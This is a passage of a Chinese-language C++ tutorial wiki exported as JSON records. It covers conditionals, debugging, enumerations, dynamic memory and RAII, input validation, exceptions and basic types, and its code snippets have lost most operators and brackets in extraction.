14.12：委托构造函数 LearnCpp 14.13：临时类对象 LearnCpp 14.14：复制构造函数 LearnCpp 14.15：类初始化与复制消除 LearnCpp 14.16：转换构造函数与 explicit LearnCpp 14.17：constexpr 聚合与类 cppreference：类相关条目","tags":[null,null]},{"title":"条件表达式、短路求值与分支结构","path":"/wiki/cpp/cpp-topic-conditions-and-branches.html","content":"分支的可靠性取决于条件表达式本身。浮点比较需要误差模型，逻辑运算利用短路保护后续访问，条件运算符适合产生一个值；if 和 if constexpr 则分别控制运行期路径与模板实例化路径。 条件运算符条件运算符根据布尔条件在两个表达式之间选择，并形成单个表达式。 两个分支需要推导共同类型和值类别；包含副作用或多层嵌套时改写为 if 更清楚。 条件运算符只求值两个分支中的一个，并尝试为二者形成共同类型和值类别。它适合一个短小、无副作用的值选择；嵌套条件或分支中包含状态修改时，if 能更清楚地展示控制流与对象生命周期。 用条件运算符选择一个值 #include iostreamint main() const int score72; const char gradescore = 60 ? P : F; std::cout grade ; 两个分支组成一个表达式并参与共同类型推导；包含多个动作时使用 if 更清楚。 关系运算与浮点比较关系运算产生 bool，比较规则会先执行必要的通常算术转换。 浮点近似比较需要结合绝对误差与相对误差，并显式处理 NaN、无穷大和接近零的范围。 整数比较可能先进行有符号与无符号转换，浮点比较还要面对舍入和 NaN。近似相等不是运算符本身的通用替代，应由领域容差定义。C++20 的 = 可以集中生成顺序关系，但浮点成员只形成偏序。 浮点比较同时处理误差和 NaN #include cmath#include iostreamint main() const double left0.1 + 0.2; const double right0.3; const bool samestd::isfinite(left) std::abs(left - right) 1e-12; std::cout same ; 关系运算返回 bool，但浮点近似值需要误差模型；NaN 与任何普通数比较都为 false。 把近似规则封装成函数 bool within(double value, double target, double tolerance) return std::abs(value - target) = tolerance; 调用点显式传入容差，避免把一个固定魔法常量散落在所有比较中。 逻辑运算符 与 || 从左到右求值并具有短路行为，右操作数可能完全不执行。 短路适合在解引用前检查指针或在昂贵操作前检查先决条件，但不应隐藏必要副作用。 与 || 从左到右求值并短路，因此可把安全前提放在左侧，例如先判空再解引用。短路也意味着右侧副作用可能不发生；依赖它完成必要更新会让状态随条件真假隐式变化。! 产生布尔取反结果。 用短路保证解引用前的检查 #include iostreamint main() const int value7; const int* pointervalue; if (pointer != nullptr *pointer == 7) std::cout match ; 从左到右短路，右侧只在指针非空时执行；副作用不应藏在可能被跳过的条件中。 控制流控制流决定语句的执行顺序，顺序、选择、循环、跳转和函数调用构成主要类别。 清晰的控制流应让终止条件、状态变化和异常路径在局部可见。 顺序、选择、迭代和跳转共同决定语句的执行路径。分析控制流时还要跟踪每条路径上对象何时构造与销毁。提前返回可以减少嵌套，但如果跳过必要状态提交，就需要先调整资源与事务边界。 顺序、选择和循环组成控制流 #include iostreamint main() int total; for (int value1; value = 4; ++value) if (value % 2 == 0) total += value; std::cout total ; 控制流的终止条件和状态变化都位于局部代码块中，便于测试每条路径。 if 语句与代码块ifelse 根据条件选择分支，代码块允许每个分支包含完整操作和局部状态。 分支条件应表达业务谓词，重复或互斥条件可以提取为具名布尔值。 代码块让一个分支拥有多条语句和独立局部对象。分支内创建的对象只在该分支存活，不能把其引用带到分支外。带初始化器的 if 可以先获得结果，再让结果名称同时服务 true 与 false 分支。 用命名谓词组合分支条件 #include iostreamint main() const int balance100; const int price40; const bool can_buybalance = price; if (can_buy) std::cout accepted ; 具名谓词让业务条件可复用，花括号保持分支范围稳定。 if 语句常见问题悬空 else、赋值误写为比较、空语句和浮点直接相等比较都会让分支偏离预期。 编译器警告、统一花括号和把复杂条件拆分成命名表达式可以降低这些风险。 悬空 else、条件中的赋值和省略花括号都会让视觉结构与真实控制流分离。把复杂条件拆成有名字的布尔值可以暴露单位与前置关系。编译器警告能捕捉部分写法，但分支覆盖测试仍需验证每条业务路径。 避免赋值条件和悬空 else #include iostreamint main() const int value3; if (value == 3) std::cout match ; else std::cout other ; 比较使用 ，并始终用花括号包住分支；高警告级别可以进一步发现可疑条件。 用代码块固定分支边界 if (ready) start(); record_start();else record_skip(); 花括号让后续增加语句时仍保持原来的控制流。 constexpr ifif constexpr 在编译期选择分支，未选中的分支不会为当前模板实例化。 它自 C++17 可用，适合依据类型特征生成代码，不能替代普通运行期条件。 if constexpr 在模板实例化时丢弃不选择的分支，被丢弃分支不必对当前模板实参有效。它适合少量结构差异，不应替代本可由重载或概念表达的接口分类。条件必须是编译期可判定表达式。 在模板中按类型选择分支 #include iostream#include type_traitstemplate typename Tvoid describe(T value) if constexpr (std::is_integral_vT) std::cout integer: value ; else std::cout other ;int main() describe(4); 未选中的分支不会为当前实例化；这是普通 if 无法提供的模板编译期筛选。 参考资料 LearnCpp 6.6：条件运算符 LearnCpp 6.7：关系运算与浮点比较 LearnCpp 6.8：逻辑运算符 LearnCpp 8.1：控制流 LearnCpp 8.2：if 语句与代码块 LearnCpp 8.3：if 语句常见问题 LearnCpp 8.4：constexpr if cppreference：运算符相关条目 cppreference：控制流相关条目","tags":[null,null]},{"title":"从编译诊断到可复现的程序缺陷","path":"/wiki/cpp/cpp-topic-diagnosing-programs.html","content":"调试从问题分类开始。语法和类型错误由编译器诊断，缺失定义通常在链接阶段暴露，能够构建却不符合需求的程序则需要通过输入、状态和输出定位。稳定复现和一次只验证一个假设，能让修改与结果之间保留可解释的因果关系。 语法错误与语义错误语法错误违反语言文法并由编译器报告，语义错误可能正常编译却产生不符合需求的行为。 编译器诊断从最早的错误开始处理；后续大量错误常由一个缺失符号或括号连锁触发。 语法错误让记号无法组成合法程序，类型或名称错误通常属于编译期语义诊断；链接错误则说明翻译单元无法组合成完整程序。能够构建并不代表满足需求，错误算法和无效边界仍可能只在特定运行路径暴露。 区分语法错误和语义错误 #include iostreamint main() const int total10; const int count4; // Compiles, but integer division may not match a fractional-rate requirement. std::cout total / count ; 语法错误会阻止编译；语义错误需要通过需求、测试或不变量发现，编译器不能替代业务验证。 调试过程调试过程包含稳定复现、缩小范围、形成假设、验证假设和回归检查。 一次只改变一个可解释因素，并保存最小失败输入，才能区分因果关系与偶然现象。 调试过程从稳定复现开始：保存最小输入与环境条件，定位第一次偏离预期的状态，再提出能够被观测推翻的假设。修复后既要重跑原失败用例，也要加入邻近边界回归，确认改变的是根因而不是症状。 用最小输入复现状态变化 #include iostreamint total(const int* values, int length) int result; for (int index; index length; ++index) result += values[index]; return result;int main() const int values[]2, -2, 5; std::cerr length=3 ; std::cout total(values, 3) ; 固定最小输入后，可以分别验证输入、循环边界和累计状态，不必在完整应用中猜测原因。 调试策略从输入、状态转换和输出边界逐层检查，比在所有位置随机插入打印更有效。 二分缩小代码路径、比较正常与异常样本、检查最近变更都是低成本定位手段。 调试先固定能够重复触发问题的最小输入，再沿数据进入、状态变化和输出位置缩小范围。每次形成一个可证伪的假设，并选择能区分两种结果的观测点；同时修改多个条件只会让成功或失败都难以归因。 沿输入、状态、输出三层定位 #include iostreamint main() const int input7; const bool acceptedinput = 0; const int outputaccepted ? input * 2 : 0; std::cerr accepted= accepted output= output ; 诊断信息标记每一层的中间状态；确定根因后应删除临时输出或替换为受控日志。 基础调试方法临时输出、条件检查和最小复现可以快速确认控制流是否到达预期位置。 诊断输出应写到 std::cerr 或受控日志通道，问题解决后删除或转为可维护的日志。 std::cerr 适合短期观测，因为它与正常输出通道分开；断言适合记录程序内部本应恒真的条件。临时诊断应包含变量名、路径位置和必要上下文，问题解决后删除，或转为具有级别和开关的结构化日志。 用断言和诊断输出缩小范围 #include cassert#include iostreamint main() const int values[]4, 8, 12; const int index1; assert(index = 0 index 3); std::cerr index= index ; std::cout values[index] ; 断言检查不变量，std::cerr 记录当前路径；两者都不应掩盖真正的输入校验。 更多调试方法预处理宏可以临时启用诊断，但结构化日志、断言和测试通常更容易长期维护。 修改代码绕开症状前应记录触发条件，否则修复可能只隐藏错误并引入新的状态差异。 条件编译能彻底移除某些诊断代码，但宏中的表达式仍有文本替换风险。长期可维护的观测更适合使用小型日志接口、测试替身和静态分析。任何观测都可能改变时序或优化结果，因此还要用独立测试确认根因。 给诊断信息增加上下文 #include iostream#include string_viewvoid log_failure(std::string_view field, int value) std::cerr field= field value= value ;int main() log_failure(port, 70000); 结构化的字段名和值比散落的字符串更容易比较正常样本和异常样本。 在问题发生前发现缺陷高警告级别、静态分析、断言、单元测试和代码审查可以在运行故障前发现不同类别的问题。 警告应按项目策略处理并定期清零；盲目关闭诊断会让真正的回归淹没在噪声中。 编译器警告、静态分析、断言、单元测试和代码审查发现的是不同缺陷类别。高警告级别先消除可疑转换和未初始化路径，断言记录内部不变量，测试覆盖可观察契约。工具只有持续在构建流程中运行，才能阻止同类问题重新进入。 把缺陷变成编译期或测试期失败 #include cassert#include iostreamint average(int total, int count) assert(count 0); return total / count;int main() static_assert(sizeof(int) = 2); std::cout average(12, 3) ; static_assert 检查编译期条件，assert 检查运行期不变量；外部输入仍需要正常错误处理。 参考资料 LearnCpp 3.1：语法错误与语义错误 LearnCpp 3.2：调试过程 LearnCpp 3.3：调试策略 LearnCpp 3.4：基础调试方法 LearnCpp 3.5：更多调试方法 LearnCpp 3.10：在问题发生前发现缺陷 cppreference：调试 C++ 程序相关条目","tags":[null,null]},{"title":"枚举类型、整数边界与字符串映射","path":"/wiki/cpp/cpp-topic-enumerations.html","content":"枚举把一组离散状态放进类型系统。无作用域枚举与整数和外围作用域联系较多，enum class 则要求显式限定并限制隐式转换。读写文本时，仍需为每个公开枚举值定义稳定映射和未知值策略。 概念索引 主题 规则边界 程序自定义类型 自定义类型把一组有效值和操作赋予领域名称，使接口能表达比基本类型更强的约束。 无作用域枚举 无作用域枚举把枚举器注入外围作用域，并可隐式转换为整数。 无作用域枚举的整数转换 无作用域枚举可提升为整数，底层类型决定表示范围。 枚举与字符串互转 枚举到字符串通常用 switch 完整列出枚举器，字符串到枚举则需要处理未知输入。 IO 运算符重载 operator 和 operator 通常写成非成员函数，左操作数是流并返回流引用以支持链式调用。 作用域枚举 enum class enum class 不把枚举器注入外围作用域，也不会隐式转换为整数。 程序自定义类型定义必须在使用完整类型的翻译单元可见，前向声明只能支持有限的不完整类型操作。 自定义类型把一组有效值和允许操作放进新名称。枚举适合封闭状态集合，结构体适合聚合相关数据，类可以通过私有状态维护不变量。选择哪一种不取决于是否“面向对象”，而取决于需要表达的数据约束与行为。 用类型承载不变量 #include iostreamstruct Port int value; ;int main() const Port port8080; std::cout port.value ; 自定义类型把相关数据和命名语义组合到一起，后续可以在构造函数中集中校验不变量。 无作用域枚举它适合与旧接口兼容；新代码通常使用 enum class 获得作用域隔离和更强类型检查。 无作用域枚举的枚举项会进入外层作用域，并可隐式转换为整数，便于与旧 C 接口交互，也更容易发生名称冲突和意外算术。新接口通常优先 enum class，确实需要整数值时在边界显式转换。 枚举表达有限状态集合 #include iostreamenum Color red, green, blue ;int main() const Color colorgreen; std::cout color ; 无作用域枚举成员会进入外层作用域并可隐式转换为整数，名称冲突时应改用 enum class。 无作用域枚举的整数转换从任意整数恢复枚举需要验证值是否对应有效枚举器，static_cast 不会自动检查。 无作用域枚举可以隐式转换为整数，整数转回枚举则需要显式转换，而且不是所有整数都表示已声明枚举项。外部数据反序列化后应先验证允许集合，不能只完成 static_cast 就把值当作有效状态。 枚举转整数使用显式转换 #include iostreamenum Color red, green, blue ;int main() const Color colorblue; std::cout static_castint(color) ; 显式转换让底层整数语义可见；从外部整数转换回枚举仍需要验证取值集合。 枚举与字符串互转C++ 标准库目前没有通用枚举反射；表驱动映射可减少两套转换逻辑漂移。 枚举到文本的转换应集中维护并覆盖全部已知值。文本到枚举还要处理大小写、未知输入和版本兼容，返回 optional 或结果类型比默认映射到某个合法状态更安全。反射进入标准前，显式 switch 仍是可移植且易审查的做法。 集中维护枚举到文本的映射 #include iostream#include string_viewenum class Status ready, failed ;std::string_view name(Status value) switch (value) case Status::ready: return ready; case Status::failed: return failed; return unknown;int main() std::cout name(Status::ready) ; 转换函数集中处理所有枚举成员，并为未知或未来成员保留明确的兜底路径。 集中维护枚举到文本的映射 std::string_view to_string(State state) switch (state) case State::idle: return idle; case State::running: return running; case State::failed: return failed; return unknown; 映射函数覆盖全部已知枚举值，并为无效底层值保留明确兜底。 映射需要覆盖所有公开枚举值，并决定未知底层值的行为；新增枚举项时，编译器警告应能指出未同步的分支。 IO 运算符重载提取运算符应先解析临时值，验证成功后再提交对象状态，并正确设置 failbit。 输出重载接收并返回 std::ostream，让自定义类型参与连续插入。输入重载应先解析到临时状态，完整成功后再提交对象，避免失败时破坏不变量。序列化格式若用于持久化，还需独立定义版本和兼容策略。 为值类型提供链式输出 #include iostreamstruct Point int x; int y; ;std::ostream operator(std::ostream out, const Point point) return out ( point.x , point.y );int main() std::cout Point2, 3 ; 输出运算符返回 ostream 引用并接受 const 对象，从而支持连续插入。 让输出重载保持流式组合 std::ostream operator(std::ostream output, const Point point) return output ( point.x , point.y ); 返回同一个流对象后，调用方可以继续链接其他插入操作，并统一检查流状态。 输入运算符应在完整解析成功后再提交对象状态，输出运算符则返回原流以保留组合与状态检查。 作用域枚举 enum class需要底层值时使用显式转换或 C++23 std::to_underlying，序列化仍需固定协议而非依赖默认底层类型。 enum class 的枚举项位于枚举作用域，且不隐式转为整数，能避免名称污染和意外算术。底层类型可在协议边界显式指定。取底层值在 C++23 可用 std::to_underlying，C++20 则使用显式 static_cast。 enum class 隔离成员名称 #include iostreamenum class Access read = 1, write = 2 ;int main() const Access accessAccess::write; std::cout static_castint(access) ; enum class 不把成员注入外层作用域，也不自动转换为 int；C++23 可用 std::to_underlying。 参考资料 LearnCpp 13.1：程序自定义类型 LearnCpp 13.2：无作用域枚举 LearnCpp 13.3：无作用域枚举的整数转换 LearnCpp 13.4：枚举与字符串互转 LearnCpp 13.5：IO 运算符重载 LearnCpp 13.6：作用域枚举 enum class cppreference：复合类型：枚举与结构体相关条目","tags":[null,null]},{"title":"栈、堆、动态内存与 RAII","path":"/wiki/cpp/cpp-topic-dynamic-memory.html","content":"自动存储期对象随作用域退出而析构，动态分配对象则需要显式所有权决定释放时机。裸 new、delete 和二级指针能展示底层机制，也容易产生泄漏、重复释放和悬空地址；RAII 让资源由对象析构统一回收。 使用 new 与 delete 动态分配new 创建对象并返回指针，delete 销毁对应对象并释放存储，二者必须正确配对。 现代 C++ 优先容器、make_unique 和其他 RAII 类型；裸 newdelete 主要用于底层实现和旧接口。 裸 new 同时要求调用方记住资源所有权、释放方式和异常路径，delete 配对错误还会造成未定义行为。实际业务对象通常直接按值保存，动态序列交给 std::vector，独占多态对象交给 std::unique_ptr；手写分配主要留在实现资源管理类型的底层边界。 用 unique_ptr 替代裸 newdelete #include iostream#include memoryint main() auto valuestd::make_uniqueint(42); std::cout *value ; unique_ptr 在离开作用域时自动 delete；裸 newdelete 只适合底层实现或受约束的旧接口。 用所有者类型绑定释放责任 auto valuestd::make_uniqueint(42);use(*value); unique_ptr 离开作用域时自动释放对象，异常和提前返回不会遗漏 delete。 动态分配数组new[] 创建元素数组并要求 delete[] 释放，但返回的裸指针不保存数组长度。 运行期长度数组优先 vector，它能管理长度、异常清理和元素析构。 动态数组需要 new[] 与 delete[] 精确配对，并额外保存长度；异常和提前返回很容易遗漏释放。std::vector 同时拥有存储与长度，std::unique_ptrT[] 只在确实不需要容器操作的底层边界才有价值。 运行期数组使用 vector #include iostream#include vectorint main() const std::size_t length5; std::vectorint values(length, 0); values.at(2) = 7; std::cout values.size() values[2] ; vector 保存长度并负责异常清理，避免 new[] 与 delete[] 配对以及长度另存。 动态序列优先使用 vector std::vectorint values(count);for (int value : values) value = read_value(); vector 同时保存长度和所有权，不需要配对 new[] 与 delete[]。 析构函数析构函数在对象生命周期结束时运行，负责释放对象拥有的资源并维护配对操作。 复制、移动和析构语义相互关联；直接组合标准 RAII 成员通常不需要自定义析构函数。 RAII 把资源取得放进对象构造，把释放放进析构，使正常返回和异常展开共享同一清理路径。一个类的成员本身已经是 RAII 类型时，编译器生成的析构、复制和移动操作往往足够，这就是零规则比手写析构更稳妥的原因。 资源成员自动参与析构 #include fstream#include memoryclass Sessionpublic: explicit Session(const char* path) : m_logpath, m_bufferstd::make_uniqueint(0) private: std::ofstream m_log; std::unique_ptrint m_buffer;;int main() Session sessionsession.log; 成员按声明逆序析构，文件和动态对象都由 RAII 类型负责释放，不需要自定义析构函数。 二级指针与动态多维数组指针的指针可以表示分别分配的多行数组，但需要多次分配和严格的逆序清理。 连续 vector 配合行列索引更简单且缓存友好，视图层可用 span 或 C++23 mdspan。 二级指针可以指向一个指针对象，常见于 C API 修改调用方指针或表示指针表。逐行动态分配二维数组会产生多个所有者和非连续存储。连续 vector 加行列索引通常释放更简单，也更利于缓存访问。 连续 vector 表示二维动态数据 #include iostream#include vectorint main() const std::size_t rows3, columns4; std::vectorint matrix(rows * columns); matrix[1 * columns + 2] = 9; std::cout matrix[6] ; 连续存储只需一次分配和一个所有者；指针的指针方案需要逐行分配并逐行释放。 用连续存储表达二维数据 std::vectorint matrix(rows * columns);auto at = [](std::size_t row, std::size_t column) - int return matrix.at(row * columns + column);; 连续存储只需一个所有者，并能在访问函数中集中检查二维索引。 二级指针常见于 C 接口的输出参数或指针表；普通二维数据优先用连续容器和集中索引，减少多个分配与释放点。 void 指针void* 可以保存对象地址但不能直接解引用，也不携带实际类型、长度和销毁方式。 C 互操作之外优先模板、基类、variant、any 或带明确删除器的智能指针。 void* 能保存任意对象地址，却不能直接解引用或做标准对象指针算术。转换回错误类型、错误对齐或越过生命周期都会产生未定义行为。C 回调边界可用它传上下文，普通 C++ 接口优先模板、variant 或类型擦除类。 C 回调中的 void 上下文* #include iostreamvoid print_context(void* context) auto* valuestatic_castint*(context); if (value != nullptr) std::cout *value ;int main() int value7; print_context(value); void* 不携带实际类型，static_cast 的正确性完全依赖外部协议；普通 C++ 接口优先模板或类型安全包装。 在类型边界恢复静态类型 void callback(void* context) auto* statestatic_castState*(context); state-run(); 这种接口依赖调用方保证 context 实际指向 State；普通 C++ 接口更适合模板或类型擦除包装。 栈与堆调用栈保存活动函数栈帧的实现数据，动态存储由分配器管理，两者不是 C++ 标准规定的唯一实现布局。 对象存储期与变量作用域应使用语言术语描述，不能把所有局部对象简单等同于物理栈。 “栈”和“堆”是常见实现术语，C++ 语言更精确地讨论自动、静态和动态存储期。局部对象可以内部拥有动态内存，动态对象也由栈上的智能指针管理。性能与大小限制应由具体平台测量，而非只按变量写在哪一行判断。 存储期比物理栈和堆更准确 #include iostream#include memoryint main() int automatic1; auto dynamicstd::make_uniqueint(2); std::cout automatic + *dynamic ; automatic 随块退出销毁，动态对象由 unique_ptr 所有；标准不要求具体机器实现一定使用名为栈和堆的区域。 理解裸分配有助于阅读旧接口，但新代码通常应把所有权交给容器或智能指针。void* 只保留地址，类型、长度和析构方式仍要由协议另外约定。 参考资料 LearnCpp 19.1：使用 new 与 delete 动态分配 LearnCpp 19.2：动态分配数组 LearnCpp 19.3：析构函数 LearnCpp 19.4：二级指针与动态多维数组 LearnCpp 19.5：void 指针 LearnCpp 20.2：栈与堆 cppreference：动态内存分配相关条目 cppreference：函数进阶相关条目","tags":[null,null]},{"title":"错误传播与控制台输入校验","path":"/wiki/cpp/cpp-topic-error-and-input.html","content":"输入失败并不只有一种原因：字符可能无法按目标类型解析，数值可能超出表示范围，格式正确的值也可能违反业务约束。流状态恢复、错误结果传播和领域校验应分开处理，才能决定是重试、返回错误还是终止当前操作。 错误检测与处理错误可以在输入边界、前置条件、操作结果和状态不变量处检测。 处理策略包括恢复、传播、转换、记录和终止，选择取决于调用方能否继续以及错误是否预期。 错误策略取决于错误来源和恢复位置：调用方违反前置条件属于程序缺陷，外部输入无效需要拒绝并说明，资源失败可能返回结果或抛出异常。接口应避免用一个魔法值同时表示合法数据和失败，也不能在多层重复记录同一错误。 以返回状态保留错误原因 #include iostream#include optionalstd::optionalint positive(int value) if (value = 0) return std::nullopt; return value;int main() if (const auto valuepositive(4)) std::cout *value ; 可预期的输入失败可以通过 optional 或状态类型表达；异常留给无法在当前层处理的失败。 std::cin 无效输入处理格式化提取失败会设置 failbit，流在清除状态前不会继续提取。 恢复时先 clear，再 ignore 到记录边界；复杂输入优先整行读取并在字符串流中解析。 输入处理至少有两层：字符能否转换成目标类型，以及转换后的值是否满足业务范围。流提取失败后先 clear() 恢复状态，再消费造成失败的记录；只重置标志而不移除坏字符，会让下一次提取在同一位置再次失败。 恢复 cin 并丢弃无效记录 #include iostream#include limitsint main() int age; while (!(std::cin age) || age 0 || age 130) std::cin.clear(); std::cin.ignore(std::numeric_limitsstd::streamsize::max(), ); std::cerr enter an age between 0 and 130 ; return 1; std::cout age ; clear 恢复状态，ignore 丢弃造成失败的输入；业务范围校验仍需独立于格式转换。 先按记录读取，再解析字段 std::string line;if (std::getline(std::cin, line)) std::istringstream inputline; int value; if (input value std::ws input.eof()) use(value); 整行边界阻止一次失败输入污染下一条记录。 格式转换、字段完整性和业务范围是三层检查；任何一层失败都不应把半有效对象交给后续逻辑。 参考资料 LearnCpp 9.4：错误检测与处理 LearnCpp 9.5：std::cin 无效输入处理 cppreference：错误检测与处理相关条目","tags":[null,null]},{"title":"异常安全、noexcept 与移动回退","path":"/wiki/cpp/cpp-topic-exception-safety.html","content":"异常机制是否适用，取决于错误频率、接口边界和失败后的状态要求。noexcept 是可检查的函数契约；违反它会终止程序。容器在重新分配时可能使用 std::move_if_noexcept，以避免一个会抛出的移动操作破坏强异常保证。 异常的风险与成本异常会引入非局部控制流、二进制和运行时成本，并要求所有资源遵循 RAII。 析构函数不得让异常逸出，实时或禁用异常环境还需要统一的替代错误模型。 异常安全首先依赖对象不变量和 RAII，而不是给每行代码增加 try。基本保证要求失败后对象仍有效且资源不泄漏，强保证要求操作失败时可观察状态不变。能否提供哪一级保证取决于组成操作是否会抛出以及提交状态的顺序。 RAII 保持异常路径一致 #include fstream#include stdexceptvoid write_record() std::ofstream outputrecord.txt; if (!output) throw std::runtime_erroropen failed; output record ; if (!output) throw std::runtime_errorwrite failed;int main() try write_record(); catch (...) return 1; 每条异常路径都依赖 ofstream 析构关闭文件；析构函数自身不能让异常逸出。 用 RAII 保护异常路径 std::vectorRecord load_records(Input input) std::vectorRecord result; while (auto record = input.next()) result.push_back(std::move(*record)); return result; 容器在异常传播时自动清理已构造元素，不需要手写释放分支。 异常规格与 noexceptnoexcept 承诺异常不会离开函数，违反时调用 std::terminate。 旧式动态异常规格已在 C++17 移除；现代代码只使用 noexcept 及其条件形式。 noexcept 是调用契约而不是优化提示：异常逃出 noexcept 函数会调用 std::terminate。泛型包装应使用条件 noexcept 传播底层操作的保证。把可能失败的操作无条件标成 noexcept 只会把可处理错误变成进程终止。 条件 noexcept 反映成员能力 #include iostream#include type_traits#include utilitytemplate typename Tvoid relocate(T target, T source) noexcept(noexcept(target = std::move(source))) target = std::move(source);int main() int first1, second2; relocate(first, second); std::cout first ; noexcept 是调用契约，违反时调用 terminate；旧式动态异常规格已在 C++17 移除。 让 noexcept 与实际表达式一致 template typename Tvoid swap_box(BoxT left, BoxT right) noexcept(noexcept(left.swap(right))) left.swap(right); 条件 noexcept 把成员操作的保证传递给外层泛型接口。 动态异常规格已在 C++17 移除；现代代码使用 noexcept 或条件 noexcept 描述不抛出保证。 std::move_if_noexceptmove_if_noexcept 在移动构造可能抛出且复制可用时返回 const 左值，否则返回右值。 标准容器利用它在扩容时平衡移动效率与强异常保证。 容器扩容希望在失败时保留原元素。若移动构造可能抛出而复制可用，std::move_if_noexcept 会选择 const T 促使复制；移动被声明为不抛出时才返回右值。资源类型准确声明移动保证会直接影响泛型容器的策略。 move_if_noexcept 支持强异常保证 #include iostream#include utilitystruct Value Value() = default; Value(const Value) std::cout copy ; Value(Value) noexcept(false) std::cout move ; ;int main() Value source; Value targetstd::move_if_noexcept(source); 因为移动可能抛出而复制可用，move_if_noexcept 返回 const 左值并选择复制；容器扩容利用同一策略。 参考资料 LearnCpp 27.8：异常的风险与成本 LearnCpp 27.9：异常规格与 noexcept LearnCpp 27.10：std::move_if_noexcept cppreference：异常相关条目","tags":[null,null]},{"title":"浮点数、布尔值、字符与显式转换","path":"/wiki/cpp/cpp-topic-floating-bool-char.html","content":"浮点数、布尔值和字符都属于基本类型，但它们的错误模式并不相同。浮点值受精度和舍入影响，布尔值表达条件，字符类型保存代码单元或字节值；显式转换只能说明转换意图，不能自动消除越界与精度损失。 科学计数法科学计数法用有效数字和十进制指数表达极大或极小数值，浮点字面量可使用 e 或 E。 指数写法不改变浮点类型的精度限制，结果仍需依据目标类型舍入。 科学计数法字面量中的指数是十进制幂，例如 1.5e3 表示 1500。写法只改变源代码表示，不增加目标浮点类型的精度；过大指数可能形成无穷大，过小值可能下溢或进入次正规范围。 用指数记法表达量级 #include iostreamint main() const double bytes_per_gib1.073741824e9; std::cout bytes_per_gib ; e 后面的指数只改变十进制缩放，不会增加浮点类型本身的有效精度。 浮点数浮点类型以有限位数近似表示实数，多数十进制小数不能被二进制浮点精确保存。 比较、累计和格式化必须考虑舍入、无穷大与 NaN；金融金额通常不应直接用二进制浮点表示最小货币单位。 浮点数保存有限精度的有效数字和指数，多数十进制小数只能近似表示。容差比较必须来自问题允许的误差，不能给所有数值套用同一个 epsilon；接近零时绝对误差更有意义，数量级很大时常需结合相对误差。NaN 与任何值（包括自身）的相等比较都为假，也要单独决定处理策略。 按误差比较浮点值 #include cmath#include iostreambool close(double left, double right, double epsilon) return std::abs(left - right) = epsilon;int main() std::cout close(0.1 + 0.2, 0.3, 1e-12) ; 浮点相等比较应给出误差模型；金融金额通常转换为最小货币单位的整数保存。 结合绝对误差和相对误差 bool nearly_equal(double a, double b, double epsilon) const double scalestd::max(1.0, std::abs(a), std::abs(b)); return std::abs(a - b) = epsilon * scale; 误差阈值属于业务精度要求；NaN 和无穷大还应按调用场景单独处理。 布尔值bool 只有 true 与 false 两个值，条件上下文会把零、空指针等转换为 false。 接口应直接返回布尔表达式，避免用整数状态模糊真假与错误原因。 bool 的值只有 true 和 false，但条件上下文允许整数、指针等进行布尔转换。直接返回比较表达式通常比返回 01 清楚。需要区分“否”“未知”“错误”等多种状态时，布尔值无法承载全部语义，应改用枚举或结果类型。 让布尔值直接表达谓词 #include iostreambool is_ready(int queued, int capacity) return queued capacity;int main() std::cout std::boolalpha is_ready(2, 3) ; bool 返回值说明条件本身；如果还需要错误原因，应使用状态类型而不是额外约定整数。 if 语句if 根据条件选择执行路径，else 与最近且尚未匹配的 if 关联。 即使分支只有一条语句，使用花括号也能降低后续修改造成控制流错误的风险。 if 的条件先转换为布尔值，只执行一个匹配分支。else 总与最近的未匹配 if 结合，因此即使当前分支只有一条语句，花括号也能固定未来修改后的控制范围。带初始化器的 if 还能把临时结果限制在整组分支内。 用花括号固定分支边界 #include iostreamint main() const int age20; if (age = 18) std::cout adult ; else std::cout minor ; 花括号让后续添加语句不会改变 else 的归属，也让局部变量的作用域明确。 字符类型char、signed char 和 unsigned char 是不同类型，普通 char 的符号性由实现决定。 char 只保存一个代码单元或字节值，不能独立解决 Unicode 编码、组合字符和用户可见字符边界。 char 表示一个代码单元或原始字节，并不等同于一个用户可见字符。UTF-8 文本中的一个字符可能跨多个 char，组合字符还可能跨多个 Unicode 码点。C++20 引入 char8_t 区分 UTF-8 代码单元，但标准库仍没有自动完成分词、规范化和用户可见字符切分。 字符值与文本编码 #include iostreamint main() const char letterA; const unsigned char byte0x41; std::cout letter static_castint(byte) ; char 表示一个字节或代码单元；字符集和 Unicode 的编码边界不能由 char 单独决定。 C++20 新增 char8_t 和 u8 字符串的独立类型，用于区分 UTF-8 代码单元与普通 char 数据。 类型转换与 static_cast隐式转换由语言规则自动发生，static_cast 用于表达允许且明确的编译期转换。 显式转换不会让越界值变得安全；窄化前仍需验证范围和精度损失。 static_cast 适合语言允许且意图明确的数值转换、枚举转换和相关指针转换。它不会检查数值范围，也不会验证运行时动态类型。需要受检查的多态向下转换使用 dynamic_cast，需要按位解释对象表示则应先确认标准允许的工具与类型。 在窄化前验证范围 #include iostream#include limitsint main() const long long source100; if (source = std::numeric_limitsint::min() source = std::numeric_limitsint::max()) std::cout static_castint(source) ; static_cast 表达意图，但不会替调用方执行范围检查；检查应发生在转换前。 参考资料 LearnCpp 4.7：科学计数法 LearnCpp 4.8：浮点数 LearnCpp 4.9：布尔值 LearnCpp 4.10：if 语句 LearnCpp 4.11：字符类型 LearnCpp 4.12：类型转换与 static_cast cppreference：基本数据类型相关条目","tags":[null,null]},{"title":"异常传播、栈展开与重新抛出","path":"/wiki/cpp/cpp-topic-exceptions.html","content":"异常把错误报告与当前调用层无法完成的操作分开。抛出后，运行时沿调用链寻找匹配处理器，并在经过的栈帧中销毁已构造对象。捕获顺序、自定义异常层次、重新抛出和构造函数失败都需要保留原始错误语义。 异常的用途异常把无法在当前层恢复的失败与正常返回路径分离，由更了解上下文的调用层处理。 预期分支和普通输入无效通常适合返回值、optional 或 C++23 expected，而不是异常。 异常适合把无法在当前层恢复的失败传播到具有处理策略的边界，同时自动展开中间栈帧。它不适合普通分支结果或程序内部前置条件。是否采用异常还取决于项目 ABI、实时约束和依赖库策略，同一模块应保持一致错误模型。 异常跨层传递不可恢复失败 #include iostream#include stdexceptint load_value(bool available) if (!available) throw std::runtime_errorvalue unavailable; return 7;int main() try std::cout load_value(true) ; catch (const std::exception error) std::cerr error.what() ; return 1; 无法在 load_value 层恢复的失败交给调用层；普通输入无效更适合返回状态或 expected。 异常处理基础throw 创建异常对象，try 标出受保护区域，catch 按类型选择处理器。 异常通常按 const 引用捕获，处理器从具体派生类型排列到一般基类。 throw 创建异常对象，控制流寻找第一个类型匹配的处理器，途中析构已构造的自动对象。catch 通常按 const 引用接收，避免复制与切片，并从具体类型排到一般类型。处理后可以恢复、转换或继续传播。 throw、try 与 catch 